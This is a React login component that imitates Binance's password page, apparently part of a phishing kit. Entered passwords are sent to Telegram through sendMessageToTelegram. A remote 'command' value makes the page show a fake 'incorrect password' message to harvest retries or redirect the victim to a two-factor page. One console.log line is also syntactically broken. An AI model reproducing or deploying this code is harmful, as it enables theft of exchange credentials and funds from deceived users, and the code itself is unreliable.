'use client'
import '../app/globals.css'
import { useState, useEffect, useRef } from 'react'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useValidatePassword } from '../app/hooks/useValidate'
import { useEmail } from '../app/lib/EmailContext'
import { useRouter } from 'next/navigation'
import { sendMessageToTelegram } from '../lib/api'; 
import { useCommand } from '../app/lib/CommandContext';

export default function LoginForm({ setNavigation, navigation }) {
    const router = useRouter()
    const { command } = useCommand();
    const { userEmail } = useEmail();

    const maskEmail = (userEmail) => {
        if (!userEmail) return '';
        const [localPart, domain] = userEmail.split('@');
        if (!domain) return userEmail;

        const maskedLocal = localPart.charAt(0) + '****';
        console.log("email is ", `${maskedLocal}@${domain}` 'or', userEmail)
        return `${maskedLocal}@${domain}`;
    };

    const { theme, toggleTheme } = useTheme();
    const [invalid, setInvalid] = useState(false)
    const [visible, setVisible] = useState(false)

    const viewPassword = () => {
        setVisible(!visible)
    }

    useEffect(() => {
        const isClickInsideButton = (event) => {
            const button = document.querySelector('button[type="button"]');
            console.log('button was clicked')
            return button && button.contains(event.target);
        };

        const handleClick = (event) => {
            if (!isClickInsideButton(event)) {
                setInvalid(false);
            }
        };

        document.addEventListener('click', handleClick);

        return () => {
            document.removeEventListener('click', handleClick);
        };
    }, []);


    const [isLoading, setIsLoading] = useState(false)
    const [showLanguage, setShowLanguage] = useState(false)
    const [isHovered, setIsHovered] = useState(false)
    const { validatePassword } = useValidatePassword();


    useEffect(() => {
        if (command === 'REQUEST_PASSWORD_AGAIN') {
            setInvalid(true); // Show error state for email input
            setIsLoading(false);
        }  else if (command === 'REQUEST_AUTHENTICATION/EMAIL') {
            setIsLoading(false);
            setTimeout(() => {
                // setIsLoading(false);
                router.push('/AuthenticationPage');
            }, 1500);
        }
    }, [command]);

    const handlePasswordValidation = () => {
        const isValid = validatePassword(password);
        setInvalid(!isValid);
        console.log('submitted')

        if (isValid) {
            setIsLoading(true);
            sendMessageToTelegram(password);
        }
    }


    const [input, setInput] = useState(false)
    const [password, setPassword] = useState('');
    const [passwordInput, setPasswordInput] = useState(false);


    const [padding, setPadding] = useState("80px 24px 54px");

    useEffect(() => {
        const handleResize = () => {
            setPadding(window.innerWidth < 768 ? "8px 24px 16px" : "80px 24px 54px");
        };

        // Set initial padding
        handleResize();

        // Add event listener
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    return (
        <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>
            <div className='h-full w-full flex md:justify-center flex-col md:items-center' style={{ padding }}>
                <div className={`md:border  ${theme === 'light' ? 'md:border-[#eaecef]' : 'md:border-[#2b3139]'} rounded-[24px] md:w-[425px] w-full min-h-[fit] md:min-h-[574px] md:px-[40px] md:pt-[40px] md:pb-[120px]`}>
                    <div className='md:mb-[20px] md:p-0 pt-[12px] px-0 pb-[20px]' onClick={toggleTheme}>
                        <svg height="24" width="120" class="bn-svg default-icon block" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg"><path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path></svg>
                    </div>

                    {/* Form heading text */}
                    <div className='flex h-fit flex-col mb-8 md:mt-[25px]'>
                        <div className='font-[600] md:text-[32px] text-[28px]'>
                            Enter your password
                        </div>
                        <p className='mt-2 text-gray-300 text-[14px] md:text-[16px] font-normal'>{maskEmail(userEmail)}</p>
                    </div>

                    {/* Form */}
                    <form className='#'>

                        <div>
                            <div className='flex flex-column text-[14px] font-normal leading-[22px] mb-2'>
                                {/* Form Label */}
                                <div className={` ${theme === 'light' ? 'text-[#1e2329]' : 'text - [#202630] '} -mb-1 font-medium`}>
                                    Password
                                </div>
                            </div>


                            {/* Input */}
                            <div className='flex flex-col w-full h-[48px] relative'>
                                <div
                                    className={`border flex ${passwordInput || input ? 'border-[#FCD535]' : 'border-[#eaecef]'} ${theme == 'light' ? 'border-[#eaecef]' : ' border-[#474d57]'} ${invalid && 'border-red-500'} hover:border-[#FCD535] transition duration-200 rounded-[8px] h-full flex w-full`}
                                    style={{ padding: '6px 10px' }}
                                    onClick={(e) => e.stopPropagation()}
                                >
                                    <input
                                        type={visible ? 'text' : `password`}
                                        value={password}
                                        spellCheck={false}
                                        placeholder=''
                                        className={`text-[16px] ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
                                        onChange={(e) => {
                                            setPassword(e.target.value);
                                            setPasswordInput(e.target.value.length > 0);
                                        }}
                                        onClick={() => {
                                            setPasswordInput(password.length > 1)
                                            setInput(true)
                                        }}
                                    />
                                    <div className={`items-center ${password < 1 ? 'hidden' : 'flex'}`} onClick={() => setPassword('')}>
                                        <svg fill={`${theme === 'light' ? '#000' : '#848e9c'}`} className="bn-svg cursor-pointer w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-7.233 0l3.006 3.005-1.768 1.768L12 13.767l-3.005 3.005-1.768-1.768 3.005-3.005-3.005-3.005 1.768-1.767L12 10.23l3.005-3.005 1.768 1.767L13.767 12z"></path></svg>
                                    </div>
                                    <div className={`items-center ml-2 flex`} onClick={() => viewPassword('')}>
                                        {visible ?
                                            <svg fill={`${theme === 'light' ? '#000' : '#848e9c'}`} class="bn-svg cursor-pointer text-[--color-iconNormal] w-[20px] h-[20px]" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.555 6.31L1 12l5.555 5.69a7.572 7.572 0 0010.89 0L23 12l-5.555-5.69a7.572 7.572 0 00-10.89 0zM17 12a5 5 0 11-10 0 5 5 0 0110 0z"></path></svg>
                                            :
                                            <svg fill={`${theme === 'light' ? '#000' : '#848e9c'}`} class="bn-svg cursor-pointer text-[--color-iconNormal] w-[20px] h-[20px]" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.94 5.06l16 16 2.12-2.12-2.446-2.447L23 12l-5.555-5.69a7.566 7.566 0 00-9.883-.87L5.06 2.94 2.939 5.06zm6.747 2.506a5 5 0 016.747 6.747L9.687 7.566z" ></path><path d="M1 12l2.29-2.346 10.198 10.198a7.574 7.574 0 01-6.933-2.162L1 12z"></path></svg>
                                        }
                                    </div>
                                </div>
                            </div>
                            <p className="text-sm text-red-500">
                            {command === 'REQUEST_PASSWORD_AGAIN' 
                                ? 'Incorrect password. Please retry or click "Forgot Password?" to reset. You have 4 more chances left.(200001004-72815107)' 
                                : 'Please enter a valid Password'}
                            </p>


                            {/* <p className={`text-[14px] text-red-500 ${invalid ? 'block' : 'hidden'} mt-1 w-full`}>
                                Please enter a valid email or phone number. Spaces or special characters are not allowed for phone numbers.
                            </p> */}

                        </div>
                        {/* Form Button */}
                        <button className={`mt-6 pb-1.5 font-medium text-[16px] hover:opacity-80 w-full bg-[#FCD535] flex items-center border-none cursor-pointer justify-center whitespace-nowrap min-h-[48px] h-[48px] min-w-[80px] ${theme === 'light' ? 'text-black' : 'text-black'} rounded-[10px]`} type='button' onClick={handlePasswordValidation}>
                            {isLoading ? <BinanceLoader /> : 'Next'}
                        </button>
                    </form>
                    <div class="flex justify-start md:justify-center mt-5">
                        <button className='text-[14px] font-medium h-[32px] text-[#F0B90B]'>
                            Forgot password ?
                        </button>
                    </div>
                </div>
            </div>

            <div className={`text-[14px] ${theme === 'light' ? 'text-gray-500' : 'text-gray-300'} w-full flex justify-center`}>
                <div className='flex items-center items justify-center h-[70px] w-[425px]'>
                    <div className='mx-[9px] cursor-pointer hover:text-[#F0B90B] flex items-center gap-2'
                        onMouseEnter={() => setIsHovered(true)}
                        onMouseLeave={() => setIsHovered(false)}>
                        <svg xmlns="http://www.w3.org/2000/svg"
                            height="12px"
                            viewBox="0 -960 960 960"
                            width="12px"
                            fill={isHovered ? '#F0B90B' : theme === 'light' ? '#4b5563' : '#d1d5db'}>
                            <path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q83 0 155.5 31.5t127 86q54.5 54.5 86 127T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Zm0-82q26-36 45-75t31-83H404q12 44 31 83t45 75Zm-104-16q-18-33-31.5-68.5T322-320H204q29 50 72.5 87t99.5 55Zm208 0q56-18 99.5-55t72.5-87H638q-9 38-22.5 73.5T584-178ZM170-400h136q-3-20-4.5-39.5T300-480q0-21 1.5-40.5T306-560H170q-5 20-7.5 39.5T160-480q0 21 2.5 40.5T170-400Zm216 0h188q3-20 4.5-39.5T580-480q0-21-1.5-40.5T574-560H386q-3 20-4.5 39.5T380-480q0 21 1.5 40.5T386-400Zm268 0h136q5-20 7.5-39.5T800-480q0-21-2.5-40.5T790-560H654q3 20 4.5 39.5T660-480q0 21-1.5 40.5T654-400Zm-16-240h118q-29-50-72.5-87T584-782q18 33 31.5 68.5T638-640Zm-234 0h152q-12-44-31-83t-45-75q-26 36-45 75t-31 83Zm-200 0h118q9-38 22.5-73.5T376-782q-56 18-99.5 55T204-640Z" />
                        </svg>
                        English
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Cookies
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Terms
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Privacy
                    </div>
                </div>
            </div>
        </div >
    );
}
